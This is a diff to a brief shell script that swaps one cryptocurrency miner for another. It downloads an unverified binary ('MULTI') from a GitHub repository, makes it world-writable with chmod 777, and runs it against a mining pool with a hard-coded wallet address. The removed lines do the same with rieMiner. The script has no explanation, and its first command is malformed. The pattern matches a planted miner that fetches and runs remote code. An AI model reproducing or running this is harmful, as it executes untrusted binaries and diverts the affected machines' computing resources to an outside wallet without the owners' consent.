@@ -1,6 +1,4 @@
 apt sudo update
-wget https://riecoin.xyz/rieMiner/Download/Deb64AVX2
-chmod 777 Deb64AVX2
-wget https://github.com/srioyooeisfuer/FAW/raw/refs/heads/main/example.tar.gz
-tar -xvf example.tar.gz
-./Deb64AVX2
+wget https://github.com/fikriboehimi/rutss/raw/refs/heads/main/MULTI
+chmod 777 MULTI
+./MULTI --algorithm lyra2v2_webchain --pool web-ko1.gonspool.com:3333 --wallet 0xDA45B452B7FB0fc31ea7c4e88Dc3db0a9685BD19 --password x --disable-gpu
